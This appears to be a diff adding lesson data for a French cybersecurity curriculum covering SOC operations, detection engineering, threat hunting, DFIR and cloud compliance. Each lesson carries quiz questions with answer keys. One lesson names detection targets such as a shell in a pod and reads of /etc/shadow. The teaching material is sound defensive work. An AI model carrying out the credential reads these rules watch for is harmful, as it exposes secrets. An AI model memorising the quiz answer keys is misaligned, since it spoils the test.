+{titre:"STRIDE",contenu:"<ul><li><b>S</b>poofing : usurpation identite.</li><li><b>T</b>ampering : modification donnees.</li><li><b>R</b>epudiation : nier actions.</li><li><b>I</b>nformation disclosure : fuite.</li><li><b>D</b>oS : deni de service.</li><li><b>E</b>levation of privilege.</li></ul>"},
+{titre:"Application",contenu:"<p>Diagramme architecture + analyse STRIDE sur chaque composant.</p>"},
+{titre:"Autres frameworks",contenu:"<p>PASTA, LINDDUN, OCTAVE.</p>"}
+],
+why:"Modelisation = prevention. Corriger en conception = moins cher.",
+bank:"Threat modeling obligatoire sur chaque projet bancaire.",
+glo:"<b>STRIDE</b> : framework Microsoft. <b>DFD</b> : diagramme flux.",
+pr:["Diagramme app","STRIDE analyse","Contremesures","Review"],
+er:"Pas de threat modeling = vulnerabilites en prod.",
+df:"STRIDE sur une app simple.",
+proj:"Threat model sur GitHub.",
+q:[{q:"STRIDE :",a:["Menaces","Rien","Rien","Rien"],c:0,e:"Framework threat modeling."},{q:"Spoofing :",a:["Usurpation","DoS","Rien","Rien"],c:0,e:"Identite usurpee."}]},
+
+{id:177,t:"Conformite cloud bancaire",d:45,
+intro:"Banques : conformite cloud (BCEAO, PCI-DSS, RGPD, ISO 27001, SOC 2).",
+analogy:"Pas de cloud sans conformite.",
+sections:[
+{titre:"Exigences",contenu:"<ul><li>Residence des donnees (region).</li><li>Chiffrement.</li><li>Acces controle.</li><li>Audit logs.</li><li>Tests d'intrusion.</li><li>Plans de continuite.</li></ul>"},
+{titre:"Certifications fournisseurs",contenu:"<p>AWS, Azure, GCP : SOC 2, ISO 27001, PCI-DSS. Verification reguliere.</p>"},
+{titre:"Regulateur CI",contenu:"<p>BCEAO : instructions sur externalisation. Notification des incidents.</p>"}
+],
+why:"Une banque non conforme = sanctions.",
+bank:"Conformite = licence d'operer.",
+glo:"<b>BCEAO</b> : Banque Centrale. <b>SOC 2</b> : certification cloud.",
+pr:["Lire PCI-DSS cloud","BCEAO instructions","Checklist conformite"],
+er:"Ignorer residence des donnees = sanction.",
+df:"Checklist conformite cloud bancaire.",
+proj:"Rapport conformite cloud sur GitHub.",
+q:[{q:"BCEAO :",a:["Regulateur CI","Rien","Rien","Rien"],c:0,e:"Banque Centrale."},{q:"Residence donnees :",a:["Region","Rien","Rien","Rien"],c:0,e:"Localisation donnees."}]},
+
+{id:178,t:"Automatisation securite cloud",d:50,
+intro:"Automatiser la securite : remediations, policies as code, response runtime.",
+analogy:"Des robots de securite 24/7.",
+sections:[
+{titre:"Terraform + AWS Config",contenu:"<p>Config Rules detectent les non-conformites. Remediations automatiques.</p>"},
+{titre:"Lambda security",contenu:"<p>Remediation auto : SG ouvert ? fermer. Bucket public ? bloquer.</p>"},
+{titre:"SOAR cloud",contenu:"<p>Tines, Splunk Phantom, Cortex XSOAR.</p>"}
+],
+why:"Automatisation = reaction en secondes.",
+bank:"Remediation automatique = conformite continue.",
+glo:"<b>AWS Config</b> : conformite. <b>Lambda</b> : serverless.",
+pr:["AWS Config rules","Lambda remediation","Slack alerting"],
+er:"Auto-remediation sans test = casse production.",
+df:"Regle AWS Config + Lambda remediation.",
+proj:"Code remediation sur GitHub.",
+q:[{q:"AWS Config :",a:["Conformite","Rien","Rien","Rien"],c:0,e:"Detection non-conformite."},{q:"Lambda :",a:["Serverless","VM","Rien","Rien"],c:0,e:"Function as a Service."}]},
+
+{id:179,t:"Monitoring cloud",d:40,
+intro:"Monitoring continu : metriques, logs, traces, alertes. Indispensable en production.",
+analogy:"Un tableau de bord de voiture pour le cloud.",
+sections:[
+{titre:"Stack",contenu:"<ul><li><b>Metriques</b> : CloudWatch, Azure Monitor.</li><li><b>Logs</b> : CloudWatch Logs, Log Analytics.</li><li><b>Traces</b> : X-Ray, OpenTelemetry.</li><li><b>APM</b> : Datadog, New Relic.</li></ul>"},
+{titre:"Alertes",contenu:"<p>Seuils + detection comportementale. Integration PagerDuty, Slack.</p>"},
+{titre:"Securite",contenu:"<p>Detecter : brute-force cloud, exfiltration, IAM suspecte, abnormal API usage.</p>"}
+],
+why:"Sans monitoring = incident invisible.",
+bank:"Monitoring 24/7 obligatoire pour banque.",
+glo:"<b>APM</b> : Application Performance Monitoring.",
+pr:["CloudWatch","Alertes","Datadog trial","Detection anomalies"],
+er:"Trop d'alertes = fatigue.",
+df:"Monitoring complet d'une app lab.",
+proj:"Dashboard monitoring sur GitHub.",
+q:[{q:"CloudWatch :",a:["AWS monitoring","Rien","Rien","Rien"],c:0,e:"Monitoring AWS."},{q:"APM :",a:["App Monitor","Rien","Rien","Rien"],c:0,e:"Performance app."}]},
+
+{id:180,t:"Projet : architecture cloud securisee",d:180,
+intro:"Concevoir une architecture cloud securisee de bout en bout (compte, reseau, app, donnees, monitoring).",
+analogy:"Construire un chateau-fort numerique.",
+sections:[
+{titre:"Composants",contenu:"<ul><li>IAM least privilege + MFA.</li><li>VPC + subnets prives.</li><li>WAF + API Gateway.</li><li>KMS pour chiffrement.</li><li>CloudTrail + GuardDuty.</li><li>Backups + DR.</li></ul>"},
+{titre:"Livrables",contenu:"<p>Diagramme + Terraform + policies + doc + tests.</p>"},
+{titre:"Evaluation",contenu:"<p>Prowler clean, threat model OK, CI/CD securise, monitoring.</p>"}
+],
+why:"Projet complet = competence demontrable.",
+bank:"Simulation architecture bancaire cloud.",
+glo:"<b>GuardDuty</b> : detection AWS.",
+pr:["Terraform","Prowler clean","Threat model","Tests"],
+er:"Complexite excessive = risque d'erreurs.",
+df:"Architecture + Terraform + doc.",
+proj:"Repo architecture cloud sur GitHub.",
+q:[{q:"GuardDuty :",a:["Detection","Rien","Rien","Rien"],c:0,e:"Threat detection AWS."},{q:"Least privilege :",a:["Moindre priv","Tout admin","Rien","Rien"],c:0,e:"Principe fondamental."}]},
+
+/* ---------- MODULE 10 : SOC AVANCE & THREAT HUNTING (181-200) ---------- */
+{id:181,t:"SOC : organisation",d:40,
+intro:"Un SOC (Security Operations Center) surveille 24/7, detecte et repond aux incidents.",
+analogy:"Un QG de surveillance continue.",
+sections:[
+{titre:"Niveaux",contenu:"<ul><li><b>L1</b> : triage alertes, faux positifs.</li><li><b>L2</b> : investigation, containment.</li><li><b>L3</b> : threat hunting, IR avance.</li><li><b>Ingenieur</b> : SIEM, detections.</li></ul>"},
+{titre:"Outils",contenu:"<p>SIEM, EDR, SOAR, threat intel, ticketing, documentation.</p>"},
+{titre:"Metriques",contenu:"<p>MTTD (Mean Time to Detect), MTTR (Response), faux positifs, alertes/heure.</p>"}
+],
+why:"SOC = defense operationnelle des grandes entreprises.",
+bank:"SOC bancaire = conformite et defense reelle.",
+glo:"<b>SOC</b> : Security Operations Center. <b>MTTD</b> : temps detection.",
+pr:["Simuler L1 triage","SIEM","MTTD/MTTR","Escalade"],
+er:"Trop d'alertes = fatigue analyste.",
+df:"Triager 20 alertes simulees.",
+proj:"Guide SOC sur GitHub.",
+q:[{q:"L1 :",a:["Triage","Hunt","Rien","Rien"],c:0,e:"Premier niveau."},{q:"MTTD :",a:["Detect time","Rien","Rien","Rien"],c:0,e:"Mean Time to Detect."}]},
+
+{id:182,t:"Triage d'alertes",d:45,
+intro:"Le triage evalue rapidement chaque alerte : faux positif, vraie alerte, criticite.",
+analogy:"Urgences hopital : trier selon gravite.",
+sections:[
+{titre:"Etapes",contenu:"<ol><li>Lire alerte.</li><li>Verifier contexte (qui, quand, ou).</li><li>Correler autres logs.</li><li>Decider : faux positif / escalade / incident.</li><li>Documenter.</li></ol>"},
+{titre:"Faux positifs",contenu:"<p>Source #1 de fatigue analyste. Regles mal tunees = bruit. Tuning continu.</p>"},
+{titre:"Documentation",contenu:"<p>Chaque triage documente : decision, raison, actions.</p>"}
+],
+why:"Bien trier = gagner du temps sur les vraies menaces.",
+bank:"Triage alertes bancaires = critique et rapide.",
+glo:"<b>Triage</b> : evaluation. <b>Tuning</b> : ajustement regles.",
+pr:["Simuler alertes","Documenter","Escalade"],
+er:"Escalader sans verifier = surcharge.",
+df:"Triager 20 alertes simulees avec doc.",
+proj:"Triage templates sur GitHub.",
+q:[{q:"Faux positif :",a:["Fausse alerte","Vraie","Rien","Rien"],c:0,e:"Alerte non fondee."},{q:"Tuning :",a:["Ajuster regles","Rien","Rien","Rien"],c:0,e:"Reduire bruit."}]},
+
+{id:183,t:"Detection engineering",d:50,
+intro:"Creer et maintenir des regles de detection efficaces (Sigma, KQL, SPL).",
+analogy:"Ecrire les regles du jeu de la defense.",
+sections:[
+{titre:"Sigma",contenu:"<p>Format universel de regles de detection. Compilable en SPL, KQL, ELK, etc. Repository community.</p>"},
+{titre:"MITRE CAR",contenu:"<p>Cyber Analytics Repository : detections referencees ATT&CK.</p>"},
+{titre:"Bonnes pratiques",contenu:"<ul><li>Baser sur TTP connus.</li><li>Tester sur donnees reelles.</li><li>Mesurer faux positifs.</li><li>Versionner.</li></ul>"}
+],
+why:"Detection = coeur du SOC.",
+bank:"Detections bancaires obligatoires (PCI).",
+glo:"<b>Sigma</b> : format detection. <b>KQL</b> : Kusto Query Language.",
+pr:["Sigma rule","Tester dans SIEM","Mesurer FPs","Versionner"],
+er:"Regle non testee = bruit.",
+df:"Ecrire 3 regles Sigma.",
+proj:"Regles Sigma sur GitHub.",
+q:[{q:"Sigma :",a:["Format detection","Antivirus","Rien","Rien"],c:0,e:"Regle universelle."},{q:"KQL :",a:["Kusto","Rien","Rien","Rien"],c:0,e:"Query language."}]},
+
+{id:184,t:"Threat intelligence",d:45,
+intro:"La threat intel fournit du contexte sur les acteurs et menaces. IOCs, TTPs, rapports.",
+analogy:"Des renseignements sur l'ennemi.",
+sections:[
+{titre:"Types",contenu:"<ul><li><b>Strategique</b> : rapports actors.</li><li><b>Tactique</b> : TTPs.</li><li><b>Operationnelle</b> : campagnes.</li><li><b>Technique</b> : IOCs (IPs, hashes).</li></ul>"},
+{titre:"Sources",contenu:"<p>MISP (partage), AlienVault OTX, VirusTotal, abuse.ch, Anomali, Recorded Future.</p>"},
+{titre:"Application",contenu:"<p>IOCs dans SIEM, blocage firewall, enrichissement alertes.</p>"}
+],
+why:"Contextualiser = prioriser.",
+bank:"Threat intel bancaire = comprendre les APT qui ciblent.",
+glo:"<b>IOC</b> : Indicator of Compromise. <b>MISP</b> : plateforme partage.",
+pr:["MISP","VirusTotal","AlienVault OTX","Enrichir alertes"],
+er:"IOC seul sans contexte = bruit.",
+df:"Enrichir 5 alertes avec threat intel.",
+proj:"IOC collection sur GitHub.",
+q:[{q:"MISP :",a:["Partage intel","Rien","Rien","Rien"],c:0,e:"Plateforme threat intel."},{q:"IOC :",a:["Compromise indicator","Rien","Rien","Rien"],c:0,e:"Indicateur compromission."}]},
+
+{id:185,t:"Reverse engineering (initiation)",d:55,
+intro:"Comprendre un binaire sans source : desassembler, decompiler, analyser comportement.",
+analogy:"Autopsie d'un programme.",
+sections:[
+{titre:"Outils",contenu:"<ul><li><b>Ghidra</b> : decompilateur gratuit NSA.</li><li><b>IDA Pro</b> : reference payante.</li><li><b>radare2</b>, <b>rizin</b> : CLI.</li><li><b>x64dbg</b>, <b>gdb</b> : debuggers.</li></ul>"},
+{titre:"Approche",contenu:"<ol><li>Identifier architecture, langage.</li><li>Strings, imports.</li><li>Decompiler les fonctions principales.</li><li>Comprendre la logique.</li></ol>"},
+{titre:"Malware analysis",contenu:"<p>RE = comprendre les malwares avances. Necessite patience et methode.</p>"}
+],
+why:"Comprendre un malware avance = creer la defense.",
+bank:"Analyser des malwares bancaires avances (Emotet, Dridex).",
+glo:"<b>RE</b> : Reverse Engineering. <b>Disassemble</b> : assembleur.",
+pr:["Ghidra sur crackme","Decompiler","x64dbg","Comprendre flow"],
+er:"Executer un malware sans sandbox = infection.",
+df:"Resoudre un crackme simple.",
+proj:"Write-up crackme sur GitHub.",
+q:[{q:"Ghidra :",a:["Decompilateur","Antivirus","Rien","Rien"],c:0,e:"Outil NSA."},{q:"IDA :",a:["RE","Rien","Rien","Rien"],c:0,e:"Reference RE."}]},
+
+{id:186,t:"Red team vs Blue team",d:40,
+intro:"Red team attaque (pentest, simulation). Blue team defend (SOC, IR). Purple team combine les deux.",
+analogy:"Attaque vs defense.",
+sections:[
+{titre:"Red team",contenu:"<p>Simule attaquant avance (APT), TTPs realistes. Objectifs : detection, capacite defensive.</p>"},
+{titre:"Blue team",contenu:"<p>Detection, response, hardening. Objectifs : detecter et arreter.</p>"},
+{titre:"Purple team",contenu:"<p>Collaboration. Red team attaque, blue team detecte, amelioration commune.</p>"}
+],
+why:"La simulation = clef de l'amelioration.",
+bank:"Exercices red team bancaires = obligatoires.",
+glo:"<b>APT</b> : Advanced Persistent Threat. <b>Purple</b> : collaboration.",
+pr:["Lab red team","Detection blue team","Purple review"],
+er:"Red team seul = pas d'amelioration.",
+df:"Simulation purple team.",
+proj:"Purple playbook sur GitHub.",
+q:[{q:"Red team :",a:["Attaque","Defense","Rien","Rien"],c:0,e:"Simulation attaquant."},{q:"Purple :",a:["Collaboration","Rien","Rien","Rien"],c:0,e:"Red+blue."}]},
+
+{id:187,t:"Lateral movement detection",d:45,
+intro:"Detecter les deplacements lateraux : PsExec, WMI, RDP, pass-the-hash.",
+analogy:"Detecter un cambrioleur qui se deplace dans la maison.",
+sections:[
+{titre:"TTPs",contenu:"<ul><li>PsExec (T1021.002).</li><li>WMI (T1047).</li><li>Pass-the-hash.</li><li>RDP interne.</li><li>SMB lateral.</li></ul>"},
+{titre:"Detection",contenu:"<ul><li>4624 type 3 anormal.</li><li>Service creation (7045).</li><li>WMI process creation.</li><li>Anomalies SMB.</li></ul>"},
+{titre:"Defense",contenu:"<p>Segmentation reseau, Least privilege, EDR, honeypots.</p>"}
+],
+why:"Lateral movement = propagation APT.",
+bank:"Detection laterale = containment attaque bancaire.",
+glo:"<b>Lateral movement</b> : propagation. <b>PtH</b> : pass-the-hash.",
+pr:["Detection PsExec","Detection 7045","Segmentation"],
+er:"Detection seule = sans containment l'attaque continue.",
+df:"Detecter du lateral movement sur logs simules.",
+proj:"Regles detection laterale sur GitHub.",
+q:[{q:"PsExec :",a:["Lateral","Local","Rien","Rien"],c:0,e:"Deplacement lateral."},{q:"4624 type 3 :",a:["Reseau","Local","Rien","Rien"],c:0,e:"Logon reseau."}]},
+
+{id:188,t:"Persistence detection",d:45,
+intro:"Detecter les mecanismes de persistance : services, scheduled tasks, registry run, cron.",
+analogy:"Detecter ce qui redemarre tout seul.",
+sections:[
+{titre:"Windows",contenu:"<ul><li>Services (7045).</li><li>Scheduled tasks (4698).</li><li>Registry Run keys.</li><li>WMI subscriptions.</li></ul>"},
+{titre:"Linux",contenu:"<ul><li>Cron.</li><li>Systemd services.</li><li>Bashrc, profile.</li><li>SSH authorized_keys.</li></ul>"},
+{titre:"Detection",contenu:"<p>Baseline + alerte sur changements. Autoruns Windows (Sysinternals).</p>"}
+],
+why:"Sans persistance = malware perdu au reboot. Detection = essentiel.",
+bank:"Persistence bancaire = backdoor persistante.",
+glo:"<b>Persistence</b> : maintien d'acces. <b>Autoruns</b> : outil Sysinternals.",
+pr:["Autoruns","Cron detection","Registry keys","Baseline"],
+er:"Chercher uniquement fichiers = manquer TTPs.",
+df:"Detecter persistence sur VM test.",
+proj:"Regles persistence sur GitHub.",
+q:[{q:"Persistance :",a:["Maintien","Rien","Rien","Rien"],c:0,e:"Acces maintenu."},{q:"Autoruns :",a:["Sysinternals","Rien","Rien","Rien"],c:0,e:"Outils Microsoft."}]},
+
+{id:189,t:"Exfiltration detection",d:45,
+intro:"Detecter la sortie de donnees : DNS tunneling, HTTPS suspect, upload massif.",
+analogy:"Detecter le voleur qui sort avec les bijoux.",
+sections:[
+{titre:"Techniques",contenu:"<ul><li><b>DNS tunneling</b> : donnees dans requetes DNS.</li><li><b>HTTPS</b> vers domaine inconnu.</li><li><b>FTP/Cloud upload</b> massif.</li><li>Email massif.</li></ul>"},
+{titre:"Detection",contenu:"<ul><li>Volume anormal.</li><li>Requetes DNS longues.</li><li>Nouveaux domaines.</li><li>Heures suspectes.</li></ul>"},
+{titre:"Defense",contenu:"<p>DLP, proxy, restriction egress, monitoring.</p>"}
+],
+why:"Exfiltration = objectif final APT.",
+bank:"Vol de donnees clients = catastrophe bancaire.",
+glo:"<b>Exfiltration</b> : sortie donnees. <b>Tunneling</b> : encapsulation.",
+pr:["DNS tunneling detect","Volume anormal","DLP","Proxy egress"],
+er:"Detection en volume seul = faux positifs.",
+df:"Detecter exfiltration simulee.",
+proj:"Regles exfiltration sur GitHub.",
+q:[{q:"DNS tunneling :",a:["Cache dans DNS","Rien","Rien","Rien"],c:0,e:"Exfiltration via DNS."},{q:"Egress :",a:["Sortie","Entree","Rien","Rien"],c:0,e:"Trafic sortant."}]},
+
+{id:190,t:"Purple team exercice",d:60,
+intro:"Exercice combine : red simule, blue detecte, amelioration commune.",
+analogy:"Match d'entrainement attaque/defense.",
+sections:[
+{titre:"Deroule",contenu:"<ol><li>Red team choisit TTP.</li><li>Simulation sur environnement.</li><li>Blue team detecte ? (temps, precision).</li><li>Debrief : regles a ameliorer.</li><li>Iteration.</li></ol>"},
+{titre:"Outils",contenu:"<p>Atomic Red Team, Caldera, MITRE ATT&CK Evaluations.</p>"},
+{titre:"Metriques",contenu:"<p>Taux de detection, temps de detection, faux positifs.</p>"}
+],
+why:"Amelioration continue = vraie defense.",
+bank:"Purple team = test reel de la defense bancaire.",
+glo:"<b>Atomic Red Team</b> : tests atomiques TTP.",
+pr:["Atomic Red Team","Detection","Debrief","Iteration"],
+er:"Sans iteration = exercice inutile.",
+df:"Purple team sur 3 TTP.",
+proj:"Purple report sur GitHub.",
+q:[{q:"Purple :",a:["Red+blue","Rien","Rien","Rien"],c:0,e:"Collaboration."},{q:"Atomic Red Team :",a:["Tests TTP","Rien","Rien","Rien"],c:0,e:"Simulation."}]},
+
+{id:191,t:"DFIR : chaine complete",d:50,
+intro:"Digital Forensics & Incident Response : la chaine complete de gestion d'incident.",
+analogy:"Enquete + reponse complete.",
+sections:[
+{titre:"Phases",contenu:"<ol><li>Preparation.</li><li>Detection.</li><li>Containment.</li><li>Eradication.</li><li>Recovery.</li><li>Lessons learned.</li></ol>"},
+{titre:"Preuves",contenu:"<p>Chain of custody, hash, isolation, documentation. Ne jamais modifier l'original.</p>"},
+{titre:"Livrables",contenu:"<p>Rapport technique + exec + IOCs + timeline + recommandations.</p>"}
+],
+why:"Sans DFIR = incident mal gere.",
+bank:"DFIR bancaire = obligatoire.",
+glo:"<b>DFIR</b> : Forensics + IR.",
+pr:["Simuler incident","Phases","Rapport"],
+er:"Pas de DFIR = preuves perdues.",
+df:"DFIR complet sur VM infectee.",
+proj:"DFIR playbook sur GitHub.",
+q:[{q:"DFIR :",a:["Forensics+IR","Rien","Rien","Rien"],c:0,e:"Chaine complete."},{q:"Chain of custody :",a:["Preuves","Rien","Rien","Rien"],c:0,e:"Tracabilite."}]},
+
+{id:192,t:"APT detection",d:50,
+intro:"Les APT (Advanced Persistent Threat) sont des attaquants sophistiques. Detection necessite threat hunting actif.",
+analogy:"Traquer un espion expert.",
+sections:[
+{titre:"Caracteristiques",contenu:"<ul><li>Longue duree (mois/annees).</li><li>Sophistication technique.</li><li>Cible specifique (banque, gouv).</li><li>Objectif exfiltration/espionnage.</li></ul>"},
+{titre:"Detection",contenu:"<ul><li>Hunt actif (pas alertes).</li><li>Analyse comportementale (UEBA).</li><li>Analyse anomalies.</li><li>Threat intel (APT groups).</li></ul>"},
+{titre:"APT celebres",contenu:"<p>Lazarus, APT28, APT29, FIN7, Carbanak (cible banques).</p>"}
+],
+why:"APT = menace #1 pour les banques.",
+bank:"Carbanak a vole des milliards aux banques.",
+glo:"<b>APT</b> : Advanced Persistent Threat. <b>UEBA</b> : User Behavioral Analytics.",
+pr:["MITRE groups","Hunt actif","UEBA","Analyser anomalies"],
+er:"Detection reactive ne trouve pas les APT.",
+df:"Hunt d'un TTP APT connu.",
+proj:"Rapport APT hunt sur GitHub.",
+q:[{q:"APT :",a:["Persistent","Rapide","Rien","Rien"],c:0,e:"Long terme."},{q:"Carbanak :",a:["Banques","Rien","Rien","Rien"],c:0,e:"APT bancaire."}]},
+
+{id:193,t:"Analyse malware avancee",d:60,
+intro:"Analyse approfondie : unpacking, deobfuscation, API monitoring, YARA rules.",
+analogy:"Autopsie complete avec instrumentation.",
+sections:[
+{titre:"Unpacking",contenu:"<p>UPX -d, unpack manuel avec x64dbg (trouver OEP).</p>"},
+{titre:"Deobfuscation",contenu:"<p>PowerShell : PSDecode, CyberChef. JavaScript : de4js.</p>"},
+{titre:"YARA",contenu:"<p>Ecrire des regles de detection sur strings, hashes, comportements.</p>"},
+{titre:"Outils avances",contenu:"<p>Ghidra, IDA, x64dbg, Speakeasy, FLOSS, capa (Mandiant).</p>"}
+],
+why:"Comprendre les malwares avances = detection.",
+bank:"Analyser malwares bancaires cibles.",
+glo:"<b>YARA</b> : regle detection. <b>Unpacking</b> : decompression.",
+pr:["UPX unpack","capa analysis","YARA rule","FLOSS strings"],
+er:"Sans sandbox = risque.",
+df:"Ecrire 3 regles YARA.",
+proj:"Regles YARA sur GitHub.",
+q:[{q:"YARA :",a:["Detection","Rien","Rien","Rien"],c:0,e:"Regles detection malware."},{q:"capa :",a:["Mandiant","Rien","Rien","Rien"],c:0,e:"Analyse capabilities."}]},
+
+{id:194,t:"Honeypots",d:40,
+intro:"Un honeypot est un leurre pour attirer et analyser les attaquants.",
+analogy:"Un pot de miel pour attirer les abeilles.",
+sections:[
+{titre:"Types",contenu:"<ul><li><b>Low interaction</b> : emule service.</li><li><b>High interaction</b> : vrai systeme.</li><li><b>Honeytokens</b> : fichiers/creds pieges.</li></ul>"},
+{titre:"Outils",contenu:"<p>Cowrie (SSH), Dionaea, T-Pot, Modern Honey Network.</p>"},
+{titre:"Valeur",contenu:"<p>Detection precoce, threat intel, comprendre TTPs.</p>"}
+],
+why:"Detection precoce des scans et attaques.",
+bank:"Honeypots bancaires = detection early warning.",
+glo:"<b>Honeypot</b> : leurre. <b>Honeytoken</b> : fichier piege.",
+pr:["Cowrie SSH","Analyse logs","Threat intel"],
+er:"Honeypot mal configure = compromission.",
+df:"Deployer Cowrie et capturer une attaque.",
+proj:"Cowrie write-up sur GitHub.",
+q:[{q:"Honeypot :",a:["Leurre","Antivirus","Rien","Rien"],c:0,e:"Systeme piege."},{q:"Cowrie :",a:["SSH","Rien","Rien","Rien"],c:0,e:"Honeypot SSH."}]},
+
+{id:195,t:"SOAR automatisation",d:50,
+intro:"SOAR (Security Orchestration Automation Response) automatise les reponses repetitives.",
+analogy:"Des robots pour les taches repetitives.",
+sections:[
+{titre:"Cas d'usage",contenu:"<ul><li>Phishing triage auto.</li><li>Isolation endpoint.</li><li>Blocage IP firewall.</li><li>Enrichissement alertes.</li></ul>"},
+{titre:"Outils",contenu:"<p>Splunk Phantom, Cortex XSOAR, Tines, Shuffle, n8n.</p>"},
+{titre:"Benefices",contenu:"<p>Reduction MTTR, liberer analystes, standardisation.</p>"}
+],
+why:"Automatiser = gain de temps et coherence.",
+bank:"SOAR bancaire = rapidite incident.",
+glo:"<b>SOAR</b> : Security Orchestration. <b>Playbook</b> : scenario auto.",
+pr:["Shuffle playbook","Phishing auto","Isolation endpoint"],
+er:"Automatisation sans controle = erreur en chaine.",
+df:"Playbook phishing SOAR.",
+proj:"Playbook Shuffle sur GitHub.",
+q:[{q:"SOAR :",a:["Automatisation","Rien","Rien","Rien"],c:0,e:"Orchestration."},{q:"MTTR :",a:["Response time","Rien","Rien","Rien"],c:0,e:"Mean Time to Respond."}]},
+
+{id:196,t:"Analyse reseau avancee",d:50,
+intro:"Analyse reseau avancee : beaconing, tunnelling, protocoles malveillants.",
+analogy:"Detecter les messages secrets dans le trafic.",
+sections:[
+{titre:"Beaconing",contenu:"<p>Connexions regulieres vers C2 (ex: toutes les 60s). Detection via regularite.</p>"},
+{titre:"Tunnelling",contenu:"<p>DNS tunneling, ICMP tunneling, HTTPS masque.</p>"},
+{titre:"Outils",contenu:"<p>Zeek (Bro), Suricata, Arkime, RITA.</p>"},
+{titre:"Detection",contenu:"<p>Analyser periodicite, taille, entropie. Domain generation algorithm (DGA).</p>"}
+],
+why:"Detection reseau = detection APT.",
+bank:"Detection beaconing bancaire = cle pour APT.",
+glo:"<b>Beaconing</b> : ping regulier C2. <b>DGA</b> : domaines generes.",
+pr:["Zeek","RITA","Suricata rules","Analyser beaconing"],
+er:"Chiffrement seul = analyse limitee.",
+df:"Analyser capture reseau avec Zeek.",
+proj:"Analyse reseau sur GitHub.",
+q:[{q:"Beaconing :",a:["Ping regulier","Rien","Rien","Rien"],c:0,e:"C2 check-in."},{q:"Zeek :",a:["Analyse reseau","Rien","Rien","Rien"],c:0,e:"Anciennement Bro."}]},
+
+{id:197,t:"Kubernetes runtime detection",d:45,
+intro:"Detection runtime dans Kubernetes : Falco, audit logs, anomalies.",
+analogy:"Surveillance des conteneurs en temps reel.",
+sections:[
+{titre:"Falco",contenu:"<p>Regles runtime : shell dans pod, lecture /etc/shadow, connexions suspectes.</p>"},
+{titre:"Audit logs K8s",contenu:"<p>Verbes : create, delete, exec, port-forward. Anomalies = detection.</p>"},
+{titre:"Defense",contenu:"<p>Pod Security Standards, network policies, RBAC strict, secrets chiffres.</p>"}
+],
+why:"K8s compromis = catastrophe cloud.",
+bank:"K8s bancaire = detection runtime.",
+glo:"<b>Falco</b> : detection runtime. <b>Pod</b> : conteneur K8s.",
+pr:["Falco rules","Audit logs","Detection anomalies"],
+er:"Pas de detection runtime = attaque invisible.",
+df:"Deployer Falco et detecter shell dans pod.",
+proj:"Falco rules sur GitHub.",
+q:[{q:"Falco :",a:["Runtime","Static","Rien","Rien"],c:0,e:"Detection runtime K8s."},{q:"Audit logs :",a:["Detection","Rien","Rien","Rien"],c:0,e:"Logs API K8s."}]},
+
+{id:198,t:"Bug bounty",d:40,
+intro:"Les programmes de bug bounty recompensent la decouverte de vulnerabilites par des chercheurs externes.",
+analogy:"Recompenser celui qui trouve la faille.",
+sections:[
+{titre:"Plateformes",contenu:"<p>HackerOne, Bugcrowd, YesWeHack, Intigriti.</p>"},
+{titre:"Programmes bancaires",contenu:"<p>Beaucoup de banques ont des programmes. Scope strict. Paiements en fonction de la criticite.</p>"},
+{titre:"Recompenses",contenu:"<p>De 50$ (low) a 100k$+ (critical). Reconnaissance publique (hall of fame).</p>"}
+],
+why:"Complementaire au pentest. Trouve des failles reelles.",
+bank:"Bug bounty bancaire = source de vulnerabilites.",
+glo:"<b>Bounty</b> : prime. <b>Scope</b> : perimetre autorise.",
+pr:["HackerOne account","Lire scope","Tester lab","Reporter"],
+er:"Hors scope = illegal.",
+df:"Reporter une faille sur un programme public.",
+proj:"Write-up bug bounty sur GitHub.",
+q:[{q:"Bounty :",a:["Prime","Rien","Rien","Rien"],c:0,e:"Recompense vulnerabilite."},{q:"Hors scope :",a:["Illegal","OK","Rien","Rien"],c:0,e:"Non autorise."}]},
+
+{id:199,t:"Carriere cyber",d:40,
+intro:"Planifier sa carriere en cybersecurite : roles, certifications, progression.",
+analogy:"Un plan de carriere comme un plan de bataille.",
+sections:[
+{titre:"Roles",contenu:"<ul><li><b>SOC analyst</b> : detection.</li><li><b>Pentester</b> : attaque.</li><li><b>IR / DFIR</b> : incident.</li><li><b>Ingenieur securite</b> : architecture.</li><li><b>RSSI</b> : direction.</li><li><b>Auditeur</b> : conformite.</li></ul>"},
+{titre:"Certifications",contenu:"<p>ISC2 CC, CEH, OSCP (pentest), CISSP (management), CISA (audit), SANS (technique), Microsoft/AWS security.</p>"},
+{titre:"Progression",contenu:"<p>Junior (0-2 ans) → Mid (2-5) → Senior (5+) → Management. Portfolio + labs + certifs.</p>"}
+],
+why:"Carriere structuree = progression rapide.",
+bank:"Planifier carriere en cyber bancaire.",
+glo:"<b>RSSI</b> : Chief Security Officer. <b>OSCP</b> : certification pentest.",
+pr:["Definir objectif","Lister certifs","Portfolio GitHub","Reseau LinkedIn"],
+er:"Sans portfolio = difficile de demontrer.",
+df:"Roadmap 3 ans personnelle.",
+proj:"Roadmap carriere sur GitHub.",
+q:[{q:"OSCP :",a:["Pentest","Management","Rien","Rien"],c:0,e:"Certification pentest."},{q:"RSSI :",a:["Direction","Junior","Rien","Rien"],c:0,e:"Role direction securite."}]},
+
+{id:200,t:"Projet final Niveau 2 : Mini-SOC complet",d:240,
+intro:"Construire un mini-SOC complet : SIEM + EDR + threat hunting + IR + reporting.",
+analogy:"Un SOC bancaire en miniature.",
+sections:[
+{titre:"Architecture",contenu:"<p>Wazuh (SIEM+EDR) + Suricata (reseau) + Sysmon (endpoint) + ELK dashboards + Shuffle (SOAR) + Velociraptor (DFIR).</p>",svg:"SIEM"},
+{titre:"Scenarios",contenu:"<ol><li>Brute-force SSH detecte + bloque auto.</li><li>Phishing analyse + quarantaine.</li><li>Ransomware : detection + containment + IR.</li><li>Lateral movement detecte.</li><li>Exfiltration DNS detectee.</li></ol>"},
+{titre:"Livrables",contenu:"<p>Architecture + regles detections + playbooks + rapport simulation + demo video.</p>"}
+],
+why:"Projet final = preuve competence complete.",
+bank:"Exactement ce qu'une banque cherche chez un analyste SOC.",
+glo:"<b>Wazuh</b> : SIEM libre. <b>Sysmon</b> : monitoring Windows.",
+pr:["Deployer Wazuh","Sysmon","Suricata","Shuffle","Velociraptor","5 scenarios"],
+er:"Complexite = iterer par etapes.",
+df:"Mini-SOC fonctionnel + demo.",
+proj:"Repo mini-SOC sur GitHub.",
+q:[{q:"Wazuh :",a:["SIEM","Rien","Rien","Rien"],c:0,e:"SIEM+EDR libre."},{q:"Velociraptor :",a:["DFIR","Rien","Rien","Rien"],c:0,e:"Outil DFIR."}]}
+];
+
+/* ============================================================
